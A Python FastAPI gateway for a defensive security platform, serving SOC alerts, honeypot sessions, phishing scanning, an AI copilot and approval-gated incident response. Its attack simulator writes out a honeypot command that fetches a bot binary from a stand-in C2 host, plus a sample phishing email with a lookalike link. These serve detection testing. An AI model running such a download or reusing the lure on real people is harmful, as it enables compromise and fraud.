"""
FastAPI gateway for Multi Modal Security.

Provides REST endpoints for querying ingested events, alerts, incidents,
honeypot sessions, attacker behavior clusters, and detection rules, plus
a WebSocket endpoint for live telemetry streaming and an interactive attack simulator.

Run from the project root::

    uvicorn src.api.main:app --reload --port 8000
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import time
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Optional

from fastapi import FastAPI, HTTPException, Query, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from opensearchpy import OpenSearch

from src.shared.config import settings
from src.shared.event_schema import Entity, SecurityEvent
from src.reporting import build_incident_report
from src.reporting.threat import build_threat_report
from src.api.reports import ReportFormat, report_response
from src.api.forensics import create_forensics_router
from src.forensics.runtime import get_evidence_vault
from src.soc.detection.rule_loader import RuleLoader
from src.soc.detection.matcher import DetectionEngine
from src.soc.correlation.engine import CorrelationEngine
from src.soc.correlation.incident_model import Incident
from src.soc.scoring.calculator import score_incident
from src.soc.alerting.alert_model import Alert
from src.soc.alerting.manager import AlertManager
from src.honeypot.recorder import SessionRecorder
from src.honeypot.server import DeceptionService
from src.honeypot.normalizer import (
    normalise_artifact_record,
    normalise_command_record,
    normalise_credential_attempt,
    normalise_session_to_event,
)
from src.honeypot.behavior import BehaviorAnalyzer
import base64
from src.copilot.models import CopilotQuery
from src.copilot.retrieval import LogRetriever, IncidentRetriever, ThreatIntelRetriever
from src.copilot.report_generator import IncidentReportGenerator
from src.copilot.tools import ToolExecutor, OPENAI_TOOLS
from src.copilot.orchestrator import CopilotOrchestrator
from src.phishing.email_analyzer import EmailAnalyzer, EmailParser
from src.phishing.url_scanner import URLScanner
from src.phishing.attachment_analyzer import AttachmentAnalyzer
from src.phishing.explanation_generator import ExplanationGenerator
from src.phishing.models import PhishingVerdict, ParsedEmail
from src.incident_response import (
    ActionExecutor,
    ApprovalError,
    ApprovalExpiredError,
    ApprovalManager,
    ApprovalNotFoundError,
    ApprovalStatus,
    IncidentNotTrackedError,
    IncidentPhase,
    IncidentStateTracker,
    InvalidApprovalStateError,
    InvalidApproverError,
    InvalidStateTransitionError,
    MockEDRBackend,
    MockFirewallBackend,
    MockWorkflowBackend,
    NoBackendAvailableError,
    ResponseAction,
    ResponsePlan,
    ResponseRecommender,
    UnapprovedActionError,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Global In-Memory Pipeline State
# ---------------------------------------------------------------------------

RULES_DIR = Path(__file__).parent.parent / "soc" / "rules"
rule_loader = RuleLoader(rules_dir=RULES_DIR)
loaded_rules = rule_loader.load_from_directory()
detection_engine = DetectionEngine(rules=loaded_rules)
correlation_engine = CorrelationEngine(correlation_window_seconds=300)
alert_manager = AlertManager(min_score_to_alert=15.0)

session_recorder = SessionRecorder()
deception_service = DeceptionService(recorder=session_recorder)
behavior_analyzer = BehaviorAnalyzer()

# In-memory recent events ring buffer (for dev fallback when OpenSearch is offline)
RECENT_EVENTS_BUFFER: list[SecurityEvent] = []
MAX_BUFFER_SIZE = 500

# AI Copilot Subsystem Initialization
log_retriever = LogRetriever(opensearch_client=None, memory_buffer=RECENT_EVENTS_BUFFER)
incident_retriever = IncidentRetriever(correlation_engine)
threat_intel_retriever = ThreatIntelRetriever(honeypot_recorder=session_recorder)
report_generator = IncidentReportGenerator(incident_retriever, threat_intel_retriever)
tool_executor = ToolExecutor(log_retriever, incident_retriever, threat_intel_retriever, report_generator)
copilot_orchestrator = CopilotOrchestrator(tool_executor)

# Phishing Detection Subsystem Initialization
phishing_url_scanner = URLScanner()
phishing_attachment_analyzer = AttachmentAnalyzer()
phishing_explanation_generator = ExplanationGenerator()
phishing_email_analyzer = EmailAnalyzer(
    url_scanner=phishing_url_scanner,
    attachment_analyzer=phishing_attachment_analyzer,
)
phishing_stats = {
    "total_emails_scanned": 0,
    "total_urls_scanned": 0,
    "total_attachments_scanned": 0,
    "phishing_detected_count": 0,
}

# Incident Response Subsystem Initialization
ir_recommender = ResponseRecommender()
ir_approval_manager = ApprovalManager()
ir_firewall_backend = MockFirewallBackend()
ir_edr_backend = MockEDRBackend()
ir_workflow_backend = MockWorkflowBackend()
ir_executor = ActionExecutor(
    approval_manager=ir_approval_manager,
    backends=[ir_firewall_backend, ir_edr_backend, ir_workflow_backend],
)
ir_state_tracker = IncidentStateTracker()
ir_plans: dict[str, ResponsePlan] = {}
ir_actions: dict[str, ResponseAction] = {}


# ---------------------------------------------------------------------------
# WebSocket connection manager
# ---------------------------------------------------------------------------


class ConnectionManager:
    """Manages active WebSocket connections for live event streaming."""

    def __init__(self) -> None:
        self._connections: list[WebSocket] = []

    async def connect(self, ws: WebSocket) -> None:
        await ws.accept()
        self._connections.append(ws)
        logger.info("WebSocket client connected (%d total)", len(self._connections))

    def disconnect(self, ws: WebSocket) -> None:
        if ws in self._connections:
            self._connections.remove(ws)
        logger.info("WebSocket client disconnected (%d remaining)", len(self._connections))

    async def broadcast(self, message: str) -> None:
        """Send *message* to all connected clients."""
        dead: list[WebSocket] = []
        for ws in self._connections:
            try:
                await ws.send_text(message)
            except Exception:
                dead.append(ws)
        for ws in dead:
            if ws in self._connections:
                self._connections.remove(ws)


manager = ConnectionManager()

# ---------------------------------------------------------------------------
# Central Event Ingestion Helper
# ---------------------------------------------------------------------------


async def ingest_pipeline_event(event: SecurityEvent) -> dict[str, Any]:
    """Pass an event through detection, correlation, scoring, and alerting."""
    # 1. Buffer event in-memory
    RECENT_EVENTS_BUFFER.insert(0, event)
    if len(RECENT_EVENTS_BUFFER) > MAX_BUFFER_SIZE:
        RECENT_EVENTS_BUFFER.pop()

    # 1b. Index into OpenSearch if available
    os_client = _get_os()
    if os_client is not None:
        try:
            os_client.index(
                index=settings.opensearch_events_index,
                id=event.event_id,
                body=event.to_opensearch_doc(),
                refresh=True,
            )
        except Exception as exc:
            logger.debug("OpenSearch indexing skipped: %s", exc)

    # 2. Evaluate detection rules
    matches = detection_engine.evaluate(event)

    # 3. Correlate into an incident
    incident = correlation_engine.process_event(event, rule_matches=matches)

    alert: Optional[Alert] = None
    if incident:
        # 4. Score and alert
        alert = alert_manager.process_incident(incident)

    # 5. Broadcast live message via WebSocket
    payload = {
        "type": "event",
        "event": event.model_dump(mode="json"),
        "rule_matches": [m.model_dump(mode="json") for m in matches],
        "incident_id": incident.incident_id if incident else None,
        "alert": alert.model_dump(mode="json") if alert else None,
        "stats": {
            "active_alerts": alert_manager.alert_count,
            "active_incidents": correlation_engine.active_incident_count,
            "honeypot_sessions": len(session_recorder.get_active_sessions()) + len(session_recorder.get_closed_sessions()),
            "rules_loaded": len(loaded_rules),
            "phishing_scans": (
                phishing_stats["total_emails_scanned"]
                + phishing_stats["total_urls_scanned"]
                + phishing_stats["total_attachments_scanned"]
            ),
        },
    }
    await manager.broadcast(json.dumps(payload))

    return {
        "event_id": event.event_id,
        "rule_matches": len(matches),
        "incident_id": incident.incident_id if incident else None,
        "alert_id": alert.alert_id if alert else None,
    }


# ---------------------------------------------------------------------------
# Background task: poll Redis Streams and relay to WebSocket clients
# ---------------------------------------------------------------------------

_relay_task: Optional[asyncio.Task] = None


async def _redis_to_websocket_relay() -> None:
    """Read new events from Redis Streams and broadcast to WebSockets if available."""
    try:
        import redis.asyncio as aioredis
        r = aioredis.from_url(settings.redis_url, decode_responses=True)
        last_id = "$"

        logger.info("Redis -> WebSocket relay started")
        while True:
            try:
                results = await r.xread(
                    streams={"events:raw": last_id},
                    count=20,
                    block=2000,
                )
            except Exception:
                await asyncio.sleep(2)
                continue

            if not results:
                continue

            for _stream, messages in results:
                for message_id, fields in messages:
                    last_id = message_id
                    data = fields.get("data", "{}")
                    try:
                        ev = SecurityEvent.from_json(data)
                        await ingest_pipeline_event(ev)
                    except Exception:
                        await manager.broadcast(data)
    except Exception as exc:
        logger.info("Redis not running or unreachable: %s (using in-memory pipeline)", exc)


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Start the Redis relay on startup, cancel it on shutdown."""
    global _relay_task
    _relay_task = asyncio.create_task(_redis_to_websocket_relay())
    yield
    if _relay_task:
        _relay_task.cancel()


# ---------------------------------------------------------------------------
# FastAPI application
# ---------------------------------------------------------------------------

app = FastAPI(
    title="Multi Modal Security — API Gateway",
    version="0.3.0",
    description="Unified API Gateway for SOC, Honeypot, Correlation, and Risk Scoring.",
    lifespan=lifespan,
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


_os_client: Optional[OpenSearch] = None
_last_os_check: float = 0.0
_OS_CHECK_INTERVAL: float = 15.0


def _get_os() -> Optional[OpenSearch]:
    global _os_client, _last_os_check
    now = time.monotonic()
    if _os_client is not None:
        return _os_client
    if now - _last_os_check < _OS_CHECK_INTERVAL:
        return None
    _last_os_check = now
    try:
        client = OpenSearch(
            hosts=[settings.opensearch_url],
            use_ssl=False,
            verify_certs=False,
            timeout=1,
        )
        if client.ping():
            _os_client = client
            return client
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# REST Endpoints — Telemetry & Events
# ---------------------------------------------------------------------------


app.include_router(create_forensics_router(get_evidence_vault, ingest_pipeline_event))


@app.get("/api/health")
async def health():
    """Liveness check and service status."""
    return {
        "status": "ok",
        "service": "mms-api-gateway",
        "rules_loaded": len(loaded_rules),
        "active_incidents": correlation_engine.active_incident_count,
        "active_alerts": alert_manager.alert_count,
        "honeypot_sessions": len(session_recorder.get_active_sessions()) + len(session_recorder.get_closed_sessions()),
        "phishing_scans": (
            phishing_stats["total_emails_scanned"]
            + phishing_stats["total_urls_scanned"]
            + phishing_stats["total_attachments_scanned"]
        ),
    }


@app.get("/api/events")
async def get_events(
    size: int = Query(default=50, ge=1, le=500, description="Number of events to return"),
    source: Optional[str] = Query(default=None, description="Filter by source module"),
    severity: Optional[str] = Query(default=None, description="Filter by severity level"),
    event_type: Optional[str] = Query(default=None, description="Filter by event type"),
):
    """Query recent security events (merging OpenSearch & in-memory buffer)."""
    events_out: list[dict[str, Any]] = []
    total = 0
    os_client = _get_os()
    if os_client is not None:
        index = settings.opensearch_events_index
        must_clauses: list[dict] = []
        if source:
            must_clauses.append({"term": {"source": source}})
        if severity:
            must_clauses.append({"term": {"severity": severity}})
        if event_type:
            must_clauses.append({"term": {"event_type": event_type}})

        body = {
            "query": {"bool": {"must": must_clauses}} if must_clauses else {"match_all": {}},
            "sort": [{"timestamp": {"order": "desc"}}],
            "size": size,
            "track_total_hits": True,
        }
        try:
            result = os_client.search(index=index, body=body)
            hits = result.get("hits", {}).get("hits", [])
            hit_total = result.get("hits", {}).get("total", 0)
            total = hit_total.get("value", 0) if isinstance(hit_total, dict) else hit_total
            events_out = [hit["_source"] for hit in hits]
        except Exception:
            pass

    # In-memory buffer fallback if OpenSearch returned nothing
    if not events_out:
        filtered = RECENT_EVENTS_BUFFER
        if source:
            filtered = [e for e in filtered if e.source == source]
        if severity:
            filtered = [e for e in filtered if e.severity == severity]
        if event_type:
            filtered = [e for e in filtered if e.event_type == event_type]
        events_out = [e.model_dump(mode="json") for e in filtered[:size]]
        total = len(filtered)

    return {"total": total, "count": len(events_out), "events": events_out}


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 2 SOC: Alerts, Incidents, & Rules
# ---------------------------------------------------------------------------


@app.get("/api/alerts")
async def get_alerts(priority: Optional[str] = None):
    """Get deduplicated, scored SOC alerts with full ScoreBreakdown and MITRE tags."""
    alerts = alert_manager.get_all_alerts(sort_by_score=True)
    if priority:
        alerts = [a for a in alerts if a.priority == priority]

    return {
        "total": len(alerts),
        "alerts": [a.model_dump(mode="json") for a in alerts],
        "stats": alert_manager.stats,
    }


@app.get("/api/incidents")
async def get_incidents():
    """Get active correlated security incidents with timelines and linked entities."""
    incidents = correlation_engine.active_incidents
    return {
        "total": len(incidents),
        "incidents": [inc.model_dump(mode="json") for inc in incidents],
    }


@app.get("/api/rules")
async def get_rules():
    """List loaded Sigma detection rules."""
    return {
        "count": len(detection_engine.rules),
        "rules": [r.model_dump(mode="json") for r in detection_engine.rules],
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 3 Honeypot: Sessions & Attacker Profiles
# ---------------------------------------------------------------------------


@app.get("/api/honeypot/sessions")
async def get_honeypot_sessions():
    """Get all active and historical honeypot deceptive sessions."""
    active = session_recorder.get_active_sessions()
    history = session_recorder.get_closed_sessions()
    all_sessions = active + history
    all_sessions.sort(key=lambda s: s.start_time, reverse=True)

    return {
        "active_count": len(active),
        "closed_count": len(history),
        "total": len(all_sessions),
        "sessions": [s.model_dump(mode="json") for s in all_sessions],
    }


@app.get("/api/honeypot/attackers")
async def get_honeypot_attackers():
    """Get attacker profiles and campaign archetype clusters."""
    all_sessions = session_recorder.get_active_sessions() + session_recorder.get_closed_sessions()
    clusters = behavior_analyzer.cluster_attackers(all_sessions)

    # Serialise clusters
    serialized_clusters = {}
    for arch, profiles in clusters.items():
        serialized_clusters[arch] = [p.model_dump(mode="json") for p in profiles]

    return {
        "clusters": serialized_clusters,
        "statistics": behavior_analyzer.generate_statistics(all_sessions),
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Interactive Simulation
# ---------------------------------------------------------------------------


class SimulationRequest(BaseModel):
    scenario: str = "multistage"
    attacker_ip: str = "203.0.113.88"


@app.post("/api/simulate/attack")
async def simulate_attack(req: SimulationRequest):
    """Trigger a realistic multi-stage attack simulation and push into live pipeline."""
    now = datetime.now(timezone.utc)
    attacker_ip = req.attacker_ip
    events_generated = []

    if req.scenario in ("ssh_brute_force", "multistage"):
        # 1. Failed SSH Attempts (triggers SOC-RULE-001 at 5 attempts)
        for i in range(5):
            ev = SecurityEvent(
                timestamp=now - timedelta(seconds=60 - (i * 2)),
                source="soc",
                severity="medium",
                entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
                event_type="auth_failure",
                raw={"service": "sshd", "line": f"Failed password for root from {attacker_ip} attempt {i+1}"},
            )
            res = await ingest_pipeline_event(ev)
            events_generated.append(res)

    if req.scenario in ("sudo_escalation", "multistage"):
        # 2. Successful Login & Sudo Escalation (triggers SOC-RULE-002 and SOC-RULE-005)
        ev_login = SecurityEvent(
            timestamp=now - timedelta(seconds=40),
            source="soc",
            severity="low",
            entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
            event_type="session_open",
            raw={"service": "sshd", "line": f"session opened for user root from {attacker_ip}"},
        )
        await ingest_pipeline_event(ev_login)

        ev_sudo = SecurityEvent(
            timestamp=now - timedelta(seconds=30),
            source="soc",
            severity="high",
            entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
            event_type="privilege_escalation",
            raw={"service": "sudo", "command": "/bin/bash", "line": "root : COMMAND=/bin/bash"},
        )
        res_sudo = await ingest_pipeline_event(ev_sudo)
        events_generated.append(res_sudo)

    if req.scenario in ("honeypot_pivot", "multistage"):
        # 3. Honeypot Deceptive Interaction (awards MULTI_SOURCE_BONUS)
        start_ts = now - timedelta(seconds=25)
        session = deception_service.handle_connection(
            source_ip=attacker_ip,
            source_port=52341,
            client_version="SSH-2.0-Paramiko_2.8.0",
        )
        session.start_time = start_ts
        deception_service.handle_auth(session.session_id, "admin", "admin123", allow_login=True)
        deception_service.handle_command(session.session_id, "whoami")
        deception_service.handle_command(session.session_id, "wget http://c2-server.org/bot.elf")
        closed = deception_service.handle_disconnect(session.session_id)

        if closed:
            closed.end_time = now
            closed.duration_seconds = 25.0
            ev_hp_cmd = normalise_command_record(closed, closed.commands[0])
            ev_hp_cmd.timestamp = start_ts + timedelta(seconds=5)
            ev_hp_dl = normalise_artifact_record(closed, closed.artifacts[0])
            ev_hp_dl.timestamp = start_ts + timedelta(seconds=12)
            ev_hp_sess = normalise_session_to_event(closed)
            ev_hp_sess.timestamp = now

            await ingest_pipeline_event(ev_hp_cmd)
            await ingest_pipeline_event(ev_hp_dl)
            res_hp = await ingest_pipeline_event(ev_hp_sess)
            events_generated.append(res_hp)

    if req.scenario in ("phishing", "phishing_campaign", "multistage"):
        # 4. Phishing Spearphishing Ingress targeting internal employee
        simulated_phishing_raw = (
            f"From: security-alerts@paypal.com.account-verification.xyz\r\n"
            f"To: analyst@prod-web-01\r\n"
            f"Subject: URGENT: Account Security Breach Detected within 24 hours!\r\n\r\n"
            f"Dear Employee,\r\n\r\n"
            f"Suspicious activity was identified originating from IP {attacker_ip}.\r\n"
            f"You must verify credentials immediately or account access will be terminated:\r\n"
            f"http://xn--pypal-4ve.com/auth/login-verify.exe\r\n\r\n"
            f"Security Operations Center"
        )
        parsed_email = EmailParser.parse_raw_string(simulated_phishing_raw)
        phish_verdict = phishing_email_analyzer.analyze(parsed_email)
        ev_phish = phishing_email_analyzer.to_security_event(phish_verdict, parsed_email)
        # Link entity to attacker IP and targeted host
        ev_phish.entity.ip = attacker_ip
        ev_phish.entity.host = "prod-web-01"
        ev_phish.timestamp = now - timedelta(seconds=10)
        res_phish = await ingest_pipeline_event(ev_phish)
        events_generated.append(res_phish)

    # Return summary of resulting pipeline state
    active_alerts = alert_manager.get_all_alerts(sort_by_score=True)
    return {
        "scenario": req.scenario,
        "attacker_ip": attacker_ip,
        "events_ingested": len(events_generated),
        "total_active_alerts": len(active_alerts),
        "top_alert": active_alerts[0].model_dump(mode="json") if active_alerts else None,
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 4 AI Security Copilot
# ---------------------------------------------------------------------------


@app.post("/api/copilot/chat")
async def copilot_chat(query: CopilotQuery):
    """Interact with the AI Security Copilot with RAG and OpenAI tool calling."""
    # Ensure log_retriever has current OpenSearch client connection
    log_retriever.os_client = _get_os()
    resp = copilot_orchestrator.ask(query)
    return resp.model_dump(mode="json")


@app.get("/api/copilot/tools")
async def get_copilot_tools():
    """List available OpenAI tool calling definitions."""
    return {"count": len(OPENAI_TOOLS), "tools": OPENAI_TOOLS}


@app.get("/api/reports/threats")
def download_threat_report(format: ReportFormat = "json"):
    incidents = [i.model_dump(mode="json") for i in correlation_engine.list_incidents()]
    events = [e.model_dump(mode="json") for e in RECENT_EVENTS_BUFFER]
    return report_response(build_threat_report(incidents, events, MAX_BUFFER_SIZE), format)


@app.get("/api/reports/incidents/{incident_id}")
def download_incident_report(incident_id: str, format: ReportFormat = "json"):
    incident = correlation_engine.get_incident(incident_id)
    if incident is None:
        raise HTTPException(status_code=404, detail="Incident not found")
    state = ir_state_tracker.get_incident_record(incident_id) if ir_state_tracker.is_tracked(incident_id) else None
    return report_response(build_incident_report(incident.model_dump(mode="json"), state), format)


class ReportRequest(BaseModel):
    incident_id: str


@app.post("/api/copilot/reports/generate")
async def generate_incident_report(req: ReportRequest):
    """Generate a structured, evidence-grounded incident report."""
    report = report_generator.generate_report(req.incident_id)
    if not report:
        raise HTTPException(status_code=404, detail=f"Incident '{req.incident_id}' not found")

    return {
        "report": report.model_dump(mode="json"),
        "markdown": report.to_markdown(),
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 5 Phishing Detection
# ---------------------------------------------------------------------------


class URLScanRequest(BaseModel):
    url: str
    source_user: Optional[str] = None
    publish_to_pipeline: bool = True


class EmailScanRequest(BaseModel):
    raw_email: Optional[str] = None
    subject: Optional[str] = None
    sender: Optional[str] = None
    recipient: Optional[str] = None
    body: Optional[str] = None
    publish_to_pipeline: bool = True


class AttachmentScanRequest(BaseModel):
    filename: str
    content_base64: Optional[str] = None
    content_text: Optional[str] = None
    content_type: str = "application/octet-stream"
    source_user: Optional[str] = None
    publish_to_pipeline: bool = True


class ExplainVerdictRequest(BaseModel):
    verdict: PhishingVerdict
    target: Optional[str] = None


class CompositePhishingScanRequest(BaseModel):
    raw_email: Optional[str] = None
    subject: Optional[str] = None
    sender: Optional[str] = None
    recipient: Optional[str] = None
    body: Optional[str] = None
    attachments: list[AttachmentScanRequest] = []
    publish_to_pipeline: bool = True


@app.post("/api/phishing/scan/url")
async def scan_phishing_url(req: URLScanRequest):
    """Scan a target URL for phishing indicators, lookalikes, and threat reputation."""
    if not req.url or not req.url.strip():
        raise HTTPException(status_code=400, detail="Target URL must not be empty.")

    verdict = phishing_url_scanner.scan_url(req.url)
    phishing_stats["total_urls_scanned"] += 1
    if verdict.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_url_scanner.to_security_event(verdict, source_user=req.source_user)
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "verdict": verdict.to_dict(),
        "structured_explanation": phishing_explanation_generator.explain(verdict).model_dump(),
        "pipeline": pipeline_res,
    }


@app.post("/api/phishing/scan/email")
async def scan_phishing_email(req: EmailScanRequest):
    """Analyze an email for phishing indicators, header anomalies, brand spoofing, and links."""
    if req.raw_email:
        parsed = EmailParser.parse_raw_string(req.raw_email)
    elif req.body or req.subject or req.sender:
        raw_msg = (
            f"From: {req.sender or 'unknown@external.net'}\r\n"
            f"To: {req.recipient or 'user@target.corp'}\r\n"
            f"Subject: {req.subject or '(No Subject)'}\r\n\r\n"
            f"{req.body or ''}"
        )
        parsed = EmailParser.parse_raw_string(raw_msg)
    else:
        raise HTTPException(status_code=400, detail="Either raw_email or body/subject/sender must be provided.")

    verdict = phishing_email_analyzer.analyze(parsed)
    phishing_stats["total_emails_scanned"] += 1
    if verdict.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_email_analyzer.to_security_event(verdict, parsed)
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "verdict": verdict.to_dict(),
        "structured_explanation": phishing_explanation_generator.explain(verdict).model_dump(),
        "pipeline": pipeline_res,
    }


@app.post("/api/phishing/scan/attachment")
async def scan_phishing_attachment(req: AttachmentScanRequest):
    """Statically scan an email attachment (no detonation/execution) for phishing & malware risks."""
    if not req.filename or not req.filename.strip():
        raise HTTPException(status_code=400, detail="Attachment filename must not be empty.")

    if req.content_base64 is not None:
        try:
            raw_bytes = base64.b64decode(req.content_base64, validate=True)
        except Exception:
            raise HTTPException(status_code=400, detail="Invalid base64 payload in content_base64.")
    elif req.content_text is not None:
        raw_bytes = req.content_text.encode("utf-8", errors="replace")
    else:
        raise HTTPException(status_code=400, detail="Either content_base64 or content_text must be provided.")

    scan_res = phishing_attachment_analyzer.scan_bytes_detailed(
        data=raw_bytes,
        filename=req.filename,
        content_type=req.content_type,
    )
    verdict = scan_res.verdict
    phishing_stats["total_attachments_scanned"] += 1
    if verdict.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_attachment_analyzer.to_security_event(
            verdict=verdict,
            features=scan_res.features,
            source_user=req.source_user,
        )
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "verdict": verdict.to_dict(),
        "features": scan_res.features.model_dump(),
        "structured_explanation": phishing_explanation_generator.explain(verdict).model_dump(),
        "pipeline": pipeline_res,
    }


@app.post("/api/phishing/explain")
async def explain_phishing_verdict(req: ExplainVerdictRequest):
    """Generate a structured, auditable explanation for an existing PhishingVerdict."""
    structured = phishing_explanation_generator.explain(req.verdict, target=req.target)
    return {"structured_explanation": structured.model_dump()}


@app.post("/api/phishing/scan/composite")
async def scan_phishing_composite(req: CompositePhishingScanRequest):
    """Run email, URL, and static attachment scanners together and return a unified explanation."""
    if req.raw_email:
        parsed = EmailParser.parse_raw_string(req.raw_email)
    elif req.body or req.subject or req.sender:
        raw_msg = (
            f"From: {req.sender or 'unknown@external.net'}\r\n"
            f"To: {req.recipient or 'user@target.corp'}\r\n"
            f"Subject: {req.subject or '(No Subject)'}\r\n\r\n"
            f"{req.body or ''}"
        )
        parsed = EmailParser.parse_raw_string(raw_msg)
    else:
        raise HTTPException(status_code=400, detail="Either raw_email or body/subject/sender must be provided.")

    email_verdict = phishing_email_analyzer.analyze(parsed)
    phishing_stats["total_emails_scanned"] += 1

    url_verdicts: list[PhishingVerdict] = []
    for u in parsed.body.extracted_urls[:10]:
        uv = phishing_url_scanner.scan_url(u)
        url_verdicts.append(uv)
        phishing_stats["total_urls_scanned"] += 1

    attachment_verdicts: list[PhishingVerdict] = []
    for att in req.attachments:
        if att.content_base64 is not None:
            try:
                raw_bytes = base64.b64decode(att.content_base64, validate=True)
            except Exception:
                raise HTTPException(status_code=400, detail=f"Invalid base64 payload for '{att.filename}'.")
        elif att.content_text is not None:
            raw_bytes = att.content_text.encode("utf-8", errors="replace")
        else:
            raw_bytes = b""
        av = phishing_attachment_analyzer.scan_bytes(
            data=raw_bytes,
            filename=att.filename,
            content_type=att.content_type,
            email_id=parsed.email_id,
        )
        attachment_verdicts.append(av)
        phishing_stats["total_attachments_scanned"] += 1

    structured = phishing_explanation_generator.explain_composite(
        email_verdict=email_verdict,
        url_verdicts=url_verdicts,
        attachment_verdicts=attachment_verdicts,
    )
    if structured.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_email_analyzer.to_security_event(email_verdict, parsed)
        event.enrichment["composite_score"] = structured.score
        event.enrichment["composite_headline"] = structured.headline
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "email_verdict": email_verdict.to_dict(),
        "url_verdicts": [v.to_dict() for v in url_verdicts],
        "attachment_verdicts": [v.to_dict() for v in attachment_verdicts],
        "structured_explanation": structured.model_dump(),
        "pipeline": pipeline_res,
    }


@app.get("/api/phishing/stats")
async def get_phishing_stats():
    """Get aggregated statistics on phishing scans, cache entries, and detections."""
    provider_name = (
        phishing_url_scanner.threat_intel.__class__.__name__
        if hasattr(phishing_url_scanner, "threat_intel") and phishing_url_scanner.threat_intel
        else "SyntheticBlocklistProvider"
    )
    hash_provider_name = phishing_attachment_analyzer.hash_provider.__class__.__name__
    return {
        "total_emails_scanned": phishing_stats["total_emails_scanned"],
        "total_urls_scanned": phishing_stats["total_urls_scanned"],
        "total_attachments_scanned": phishing_stats["total_attachments_scanned"],
        "phishing_detected_count": phishing_stats["phishing_detected_count"],
        "cache_entries": len(phishing_url_scanner.cache) + len(phishing_attachment_analyzer.cache),
        "threat_intel_providers": [provider_name, hash_provider_name],
    }


# ---------------------------------------------------------------------------
# Incident Response Endpoints (Phase 7)
# ---------------------------------------------------------------------------


class IRApprovalDecisionRequest(BaseModel):
    analyst_id: str
    reason: str = ""


class IRStateTransitionRequest(BaseModel):
    to_phase: IncidentPhase
    actor: str = "analyst"
    reason: str = ""


@app.post("/api/ir/recommend/{incident_id}")
async def ir_recommend(incident_id: str, incident_override: Optional[Incident] = None):
    """Generate a response plan and pending approval requests for an incident."""
    incident = incident_override or correlation_engine.get_incident(incident_id)
    if incident is None:
        raise HTTPException(status_code=404, detail=f"Incident '{incident_id}' not found")

    if not ir_state_tracker.is_tracked(incident.incident_id):
        ir_state_tracker.register_incident(incident.incident_id, actor="system")

    plan = ir_recommender.recommend(incident)
    ir_plans[plan.plan_id] = plan
    ir_state_tracker.link_plan(incident.incident_id, plan.plan_id)

    approval_requests = []
    for action in plan.actions:
        ir_actions[action.action_id] = action
        req = ir_approval_manager.request_approval(
            action=action,
            incident_id=incident.incident_id,
            plan_id=plan.plan_id,
        )
        approval_requests.append(req.model_dump(mode="json"))

    return {
        "plan": plan.model_dump(mode="json"),
        "approval_requests": approval_requests,
    }


@app.get("/api/ir/approvals")
async def ir_list_approvals(
    incident_id: Optional[str] = Query(default=None),
    status: Optional[ApprovalStatus] = Query(default=None),
):
    """List approval requests, optionally filtered by incident_id or status."""
    ir_approval_manager.expire_stale()
    reqs = ir_approval_manager.list_requests(incident_id=incident_id, status=status)
    return {"approvals": [r.model_dump(mode="json") for r in reqs], "count": len(reqs)}


@app.post("/api/ir/approvals/{request_id}/approve")
async def ir_approve_request(request_id: str, body: IRApprovalDecisionRequest):
    """Approve a pending containment/response action request."""
    req = ir_approval_manager.get_request(request_id)
    if req is None:
        raise HTTPException(status_code=404, detail=f"Approval request '{request_id}' not found")
    action = ir_actions.get(req.action_id)
    try:
        decision = ir_approval_manager.approve(
            request_id=request_id,
            analyst_id=body.analyst_id,
            reason=body.reason,
            action=action,
        )
    except InvalidApproverError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except ApprovalExpiredError as exc:
        raise HTTPException(status_code=410, detail=str(exc))
    except InvalidApprovalStateError as exc:
        raise HTTPException(status_code=409, detail=str(exc))
    except ApprovalNotFoundError as exc:
        raise HTTPException(status_code=404, detail=str(exc))

    updated_req = ir_approval_manager.get_request(request_id)
    return {
        "decision": decision.model_dump(mode="json"),
        "request": updated_req.model_dump(mode="json") if updated_req else None,
    }


@app.post("/api/ir/approvals/{request_id}/reject")
async def ir_reject_request(request_id: str, body: IRApprovalDecisionRequest):
    """Reject a pending containment/response action request."""
    req = ir_approval_manager.get_request(request_id)
    if req is None:
        raise HTTPException(status_code=404, detail=f"Approval request '{request_id}' not found")
    action = ir_actions.get(req.action_id)
    try:
        decision = ir_approval_manager.reject(
            request_id=request_id,
            analyst_id=body.analyst_id,
            reason=body.reason,
            action=action,
        )
    except InvalidApproverError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except ApprovalExpiredError as exc:
        raise HTTPException(status_code=410, detail=str(exc))
    except InvalidApprovalStateError as exc:
        raise HTTPException(status_code=409, detail=str(exc))
    except ApprovalNotFoundError as exc:
        raise HTTPException(status_code=404, detail=str(exc))

    updated_req = ir_approval_manager.get_request(request_id)
    return {
        "decision": decision.model_dump(mode="json"),
        "request": updated_req.model_dump(mode="json") if updated_req else None,
    }


@app.post("/api/ir/execute/{action_id}")
async def ir_execute_action(action_id: str):
